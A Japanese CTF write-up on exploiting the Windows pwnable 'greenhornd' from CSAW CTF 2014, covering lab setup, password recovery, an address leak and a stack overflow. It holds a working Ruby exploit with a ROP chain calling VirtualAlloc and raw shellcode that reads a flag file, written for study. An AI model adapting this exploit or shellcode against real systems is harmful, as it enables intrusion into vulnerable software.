---
title: "CSAW CTF 2014 Greenhornd writeup"
date: 2019-09-19T23:49:38+09:00
draft: false
categories:
- writeup
---

## はじめに

本記事では、CSAW CTF 2014 で出題されたWindows 環境のPwnable 問題「greenhornd」を解説する。CTF におけるWindows のPwnable 問題が割合がかなり少なく知見もあまりまとまっていない分野なので自分の学習がてらまとめてみた。Linux でのPwnに慣れている人向けの記述になっているので、うまく補完しながら読んでほしい。

## 1. 環境準備

### 1.1 Windows OS の準備

Linux と異なり環境構築に戸惑う人もいると思うので準備方法を記載していく。Windows OS自体は、Edgeのテスト用として用意されている、[Free Virtual Machines from IE8 to MS Edge - Microsoft Edge Development](https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/) を用いる。本ページにアクセスしたら、「Virtual machine」の欄を「IE11 on Win81 (x86)」に選択、「Select platform」を「VirtualBox」にして、ダウンロードボタンをクリックする。ダウンロードが完了したらzipを展開し、仮想マシンをインポートする。

### 1.2 解析環境の準備

本VMは、ドライブが備わっていないので、VirtualBoxの設定からドライブを作成して、Guest Addition をインストールする。インストール後は、共有フォルダあるいはD&Dやクリップボードの共有ができるようにしてホストマシンと相互にやりとりできるようにしておく。また、ホストマシンと本VMにpingが届くことも確認しておく(Windows はpingをデフォルトで応答しないので、VM側からホストマシン側へ飛ばすと良い。)  最後に、検証やポートの公開などで面倒なので、Windows Firewall を無効にしておく。  

次に、本問題フアィルと解析する際にVM側に必要なソフトウェアをダウンロードする。以下に列挙する。  

- [greenhornd.exe](https://github.com/ctfs/write-ups-2014/blob/master/csaw-ctf-2014/greenhornd/greenhornd.exe)
  - 問題のバイナリファイル
- [AppJailLauncher.exe](https://github.com/ctfs/write-ups-2014/blob/master/csaw-ctf-2014/greenhornd/AppJailLauncher.exe)
  - Windows におけるPwn 問題を動作させる定番のソフトウェア(らしい)
- [Visual Studio 2013 の Visual C++ 再頒布可能パッケージ](https://www.microsoft.com/ja-jp/download/details.aspx?id=40784)
  - greenhornd を実行しようとすると「msvcr120.dll」が無いためにエラーになるのでインストールする
  - ちなみにmsvcr120.dll は、libcに入っているような標準的な関数を提供するDLL
- [Visual Studio 2019](https://visualstudio.microsoft.com/ja/downloads/?rr=https%3A%2F%2Fdocs.microsoft.com%2Fja-jp%2Fvisualstudio%2Finstall%2Finstall-visual-studio%3Fview%3Dvs-2019)
  - PoC 作成用に利用
  - 特に個別パッケージのMSVC vXXX - VS 2019 C++ x64/x86 build tools には、cl や dumpbin など便利なコマンドが多いのでインストール推奨
- [x64dbg](https://x64dbg.com/#start)
  - Windows における代表的なデバッガの1つ
- [PeStudio](https://www.winitor.com/get.html)
  - PEビューワ、マルウェア解析などでも必須となるアイテム
  - でかいファイルを扱うと重い
- [DLL Export Viewer](https://www.nirsoft.net/utils/dll_export_viewer.html)
  - DLL がExplortする関数一覧の閲覧や検索ができるGUIソフト
  - 比較的大きなDLLでもさばけるためDLLから関数を探す時などはこちらを利用
- [cdb, Windbgなどのデバッグツール](https://docs.microsoft.com/ja-jp/windows-hardware/drivers/download-the-wdk)
  - シェルコードのデバッグやPoC 用に利用

ホスト側には概ね以下のソフトウェアが入っていれば良いだろう。

- exploit コードを作成するためのプログラミング環境 (Python, Rubyなど)
- rp++ などのROP Gadget 検索ツール
- IDA, Ghidra などの逆アセンブラ

必要なソフトウェアのインストールなどが終わったら次に実際に`greenhornd.exe` を問題のように動作させてみる。動作させる際には前述した`AppJailLauncher.exe` を利用する。デスクトップなどに、以下の内容の`run.bat` を作成する。これでダブルクリックでいつでも問題を動作させることができる。また、同じディレクトリに`greenhornd.exe` と`key` というファイル名でFLAGを書いたテキストファイルを用意しておこう。
```
AppJailLauncher.exe /network /key:key /port:9998 /timeout:30 greenhornd.exe
```
実際にダブルクリックすると以下のような画面になる。その後、ホストマシンから、本VMの9998番ポートへ向けて接続してみよう。
```
nc <VMのIPアドレス> 9998
```

正しく動作していれば、Passsword を求められる文字列が帰ってくるはずだ。ここまでが設定できれば、あとは解析をスタートさせることができる。

## 2. 解析

まずは、先程nc でつないだところからのスタートだ。パスワードの入力を求められているので、バイナリ中からパスワードを探そう。この時重要なのは、本問題はPwnableであってReversingではない。つまり、難しい技を使ってパスワードを隠していることは考えにくい。そこで、手始めにstrings コマンドとgrep でpasswordを引っ掛けてみよう。grep で検索をかける際には、大文字小文字を無視する-i オプションを付けておくと良い。

```
strings greenhornd.exe | grep -i password
To continue, you're going to need the password. You can get the password by running strings from minsys (strings - greenhorn.exe) or locate it in IDA.
Password: 
GreenhornSecretPassword!!!
Incorrect Password.
Password accepted.
```

この結果から、気になる文章はあるものの、`GreenhornSecretPassword!!!` が怪しいと感じるだろう。nc でつないで、この文字列を入力してみよう。そうすると、さらに応答が進み選択画面が出てくるはずだ。割愛するが、重要な選択肢は、(A)と(V)だ。(A) を選ぶと、PEファイルのベースアドレスとスタックのアドレスがリークする。つまり、Windows におけるASLRをBypassすることが可能となる。(V) を選択すると1024 byteの入力を行うことができる。この2つ以外はどれも説明の文字列が帰ってくるだけだ。

今回は、Ghidra を用いて逆アセンブル、逆コンパイル結果を見ながら詳細な解析を勧めていく。PeStudioなどの.textセクションのvirtual address や文字列などを起点にxref機能などを使ってバイナリ中を動き回ると、`0x401000` がmain関数にあたる部分だとわかる。さらに、下図からも先程入力したパスワードがstrncmp関数で比較されており正しいことがわかる。解析する際には、積極的に関数名や変数名をわかりやすい形に変更していくことをおすすめする。Ghidra はまだ世に出て慣れ親しんでいない人も多いので、[Ghidra Pro Book](https://booth.pm/ja/items/1575255) を一読することをおすすめする。

![main関数付近のデコンパイル画面](https://imgur.com/download/UIkarAm)

さらにswitch 文のところから、(V)の処理の実際の関数は、`0x401210`だとわかるので見てみる。

![選択肢Vの関数](https://imgur.com/download/sNFqhmW)

中では、0x800 という引数があることがわかる。読み込む処理が本処理しかないため、この値は読み込みバイト数だと推測できるが、促されている長さは1024なためBuffer Overflow が発生するとわかる。さらに条件分岐で、`C` の文字が先頭に入っているとexit処理に移る。実際にデバッガでこの周辺処理や1024文字以上を入力した場合の挙動を見てみると、ebpレジスタが指すアドレスの次のワードがreturn address になっていることがわかる。今回の場合、return address が格納されたアドレスが`0x03CFAC0` 、入力するバッファの先頭アドレスが`0x03CF6C0` だったので、先頭から1028byte分のパディングをした後に、return address を書き換えることが可能だとわかる。これで、EIPは奪えたことになる。(こういった動的なデバッグの際には、攻撃コードを送る手前で、exploitコード側で標準入力を受け付けておき、デバッガで対象プロセスにアタッチし、ブレークポイントを貼って、exploitコードで適当なキーを叩き実行を進めて止めるやり方が便利。)

ここまでの情報を整理すると、以下のようになる。これらを踏まえてExploit 作成に移る。

- 1028 バイトのパディングを入れることで、Return address を書き換えることができる
- PEのベースアドレスとスタックのアドレスは、リーク可能

## 3. Exloit コードの作成

まずは、Exploit の方針を明示する。今回は、VirtualAlloc関数を使って、スタックの領域をRWXな領域に変更し、シェルコードを実行して、keyファイルの内容を出力する方針を取る。VirtualAlloc関数の実アドレスは、0x402000(RVA) に存在するため、ROPで本アドレスの中にあるアドレスにジャンプすることを試みる。本コードには、switch文があり、`dword[ecx*4+0x401160]` にjmpする処理が存在する。そのため、ecxを適切な値にしてこのjmp処理に制御を移すことで任意のアドレスにjmpすることができる。そこで、バイナリ中に`pop ecx; ret` が行えるROP Gadgetがあるか調べると、いくつかGadget が見つかるため、本方針でVirtualAlloc関数に飛ばすことは可能だと考えられる。  

```shell
$ rp-osx-x64 -r 1 -f greenhornd.exe | grep 'pop ecx'
0x0040178c: pop ecx ; ret  ;  (1 found)
0x004018b5: pop ecx ; ret  ;  (1 found)
0x00401c20: pop ecx ; ret  ;  (1 found)
```

次に、VirtualAllocでスタックのパーミッションを書き換えた後に実行するシェルコードについて考えてみる。Linux と異なりWindows の場合システムコール番号などが各種OSで異なっておりLinux に比べて生のシステムコールを読ぶのは汎用性が低いシェルコードになってしまう。そのため、Windowsの場合はWin32 APIを呼び出して実行するシェルコードを作成する。今回は、`key` というファイルの中身を見たいので、ファイルを開いて、読み出し、書き出す処理を行う必要がある。そこで、PEバイナリに含まれているReadFileやWriteFileを用いれば良いと考えられるが、これらの関数を実行するためには事前に対象ファイルのファイルハンドラを取得する必要があり、そのためには引数の多いCreateFile関数を呼ばなくてはならない。今回の場合は特に成約が厳しくないが、長さ制限などがある場合は、`_open`, `_read`, `_write` を使ってLinuxライクなシェルコードを作成して短くする方法がある。今回は、その方針で作成した。Windows におけるシェルコード作成方法などについては、[Windowsで電卓を起動するシェルコードを書いてみる](http://inaz2.hatenablog.com/entry/2015/04/23/013858) がとてもわかりやすいので参照してほしい。今回は、本サイトのシェルコードを改変する形で以下のシェルコードを作成した。mainラベルより上はサイトと全く同じため省略する。

```asm
main:
    push 0079656bh	; key
    mov eax, esp
    push 0
    push 0
    push eax
    push 0e12e0c6eh  	; open("key", 0, 0)
    call api_call
    mov ebx, eax        ; ファイルディスクリプタをebxに退避
    push 100h		    ; len
    lea ebp, [esp+100h]	; buffer
    push ebp            
    push ebx
    push 0e70e09a4h	    ; read(fd, esp+100h, 100h)
    call api_call
    push 100h
    push ebp
    push 1
    push 067a78ad5h	    ; write(fd, esp+100h, 100h)
    call api_call
    push 73e2d87eh      ; ExitProcess
    call api_call

end start
```

最後に、以下にexploit の全体コードを示す。

```ruby
#!/usr/bin/env ruby
# coding: ascii-8bit
require 'pwn'

host = '192.168.0.109'
port = 9998
$z = Sock.new host, port
def z; $z; end
context.log_level = :info

password = "GreenhornSecretPassword!!!"
puts "Password: #{password}"
z.recvuntil "Password: "
z.sendline password
z.recvuntil "Selection: "

puts "[*] Select A to leak and calculate some addresses"
z.sendline "A"
tmp = z.recvuntil "Selection: "
text_base = tmp.match(/is: (.*) /)[1].to_i(16)
stack_addr = tmp.match(/at: (.*)\./)[1].to_i(16)
pop_ecx_ret = text_base + 0x0040178c
jmp_memory = text_base + 0x0040110d
puts "image base address        : 0x%x" % text_base
puts "Stack address             : 0x%x" % stack_addr
puts "pop ecx; ret              @ 0x%x" % pop_ecx_ret
puts "jmp dword[0x401160+ecx*4] @ 0x%x" % jmp_memory

puts "[*] Select V to overflow"
z.sendline "V"
z.recvuntil ").\n\n"

shellcode = "\xFC\xEB\x67\x60\x33\xC0\x64\x8B\x40\x30\x8B\x40\x0C\x8B\x70\x14\xAD\x89\x44\x24\x1C\x8B\x68\x10\x8B\x45\x3C\x8B\x54\x05\x78\x03\xD5\x8B\x4A\x18\x8B\x5A\x20\x03\xDD\xE3\x39\x49\x8B\x34\x8B\x03\xF5\x33\xFF\x33\xC0\xAC\x84\xC0\x74\x07\xC1\xCF\x0D\x03\xF8\xEB\xF4\x3B\x7C\x24\x24\x75\xE2\x8B\x5A\x24\x03\xDD\x66\x8B\x0C\x4B\x8B\x5A\x1C\x03\xDD\x8B\x04\x8B\x03\xC5\x89\x44\x24\x1C\x61\x59\x5A\x51\xFF\xE0\x8B\x74\x24\x1C\xEB\xA6\x68\x6B\x65\x79\x00\x8B\xC4\x6A\x00\x6A\x00\x50\x68\x6E\x0C\x2E\xE1\xE8\x83\xFF\xFF\xFF\x8B\xD8\x68\x00\x01\x00\x00\x8D\xAC\x24\x00\x01\x00\x00\x55\x53\x68\xA4\x09\x0E\xE7\xE8\x69\xFF\xFF\xFF\x68\x00\x01\x00\x00\x55\x6A\x01\x68\xD5\x8A\xA7\x67\xE8\x57\xFF\xFF\xFF\x68\x7E\xD8\xE2\x73\xE8\x4D\xFF\xFF\xFF\x00\x00\x00\x00\x6E\x8F\x87\x5D\x00\x00\x00\x00\x0D\x00\x00\x00\x40\x00\x00\x00\x1C\x20\x00\x00\x1C\x04\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\xB6\x00\x00\x00\x2E\x74\x65\x78\x74\x24\x6D\x6E\x00\x00\x00\x00\x00\x20\x00\x00\x1C\x00\x00\x00\x2E\x72\x64\x61\x74\x61\x00\x00\x1C\x20\x00\x00\x50\x00\x00\x00\x2E\x72\x64\x61\x74\x61\x24\x7A\x7A\x7A\x64\x62\x67\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

payload = "C" * 1028          # 1028 byte
payload << p32(pop_ecx_ret)   # Overwrite return address
payload << p32(936)           # ecx <- 936
payload << p32(jmp_memory)    # jmp dword [0x401160+ecx*4] -> 0x402000 (VirtualAlloc)
payload << p32(stack_addr+44) # the head address of shellcode
payload << p32(stack_addr)    # lpAddress
payload << p32(1024)          # dwSize = 1024
payload << p32(0x1000)        # flAllocationType = MEM_WRITE
payload << p32(0x40)          # flProtect = PAGE_EXECUTE_READWRITE
payload << shellcode
puts "[*] Send payload"
z.sendline payload
puts z.recvuntil "}"
```

以下が実行結果である。

![x.rbの実行結果](https://imgur.com/download/U7pR2SU)

## 4. おわりに

本記事では、CTFの問題を使ってWindows におけるExploitのための環境構築方法やLinuxとの差について簡単に記した。本問題は、古い問題のためセキュリティ機構などもゆるい。現実の世界でのExploitは、もっと難しいはずだ。しかしながら、本問題のような簡単なBOFを利用したROPなどの古典的なテクニックを理解しておくことで、脅威の度合いについて正しく理解できるだろう。余力があれば、さらに異なるWindows Exploit 問題のWriteupを書いていきたい。
